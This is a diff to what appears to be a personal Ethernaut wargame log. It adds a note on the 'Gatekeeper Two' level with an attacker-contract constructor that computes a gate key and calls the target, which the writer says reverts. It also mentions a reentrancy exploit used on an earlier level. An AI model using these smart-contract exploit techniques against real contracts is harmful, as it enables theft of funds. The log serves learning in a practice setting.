@@ -7,6 +7,23 @@
 
 ---
 
+### Ethernaut #4
+
+Gatekeeper Two - Spent too long on this. I keep getting `Gas estimation errored with the following message (see below). The transaction execution will likely fail. Do you want to force sending?
+execution reverted`. 
+
+My code:
+
+```
+constructor() {
+        GatekeeperTwo gate = GatekeeperTwo(0xf59112032D54862E199626F55cFad4F8a3b0Fce9);
+        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        require(gate.enter{ gas: gasleft() }(gateKey));
+}
+```
+
+---
+
 ### 1/6/2022 Ethernaut #3
 
 Reentrance - [Bad actor contract](https://goerli.etherscan.io/address/0xeAb3e298d11501f2c625AFa4AD9b65f4753d9457). Reentrancy attack calling withdraw again in `receive()`. 
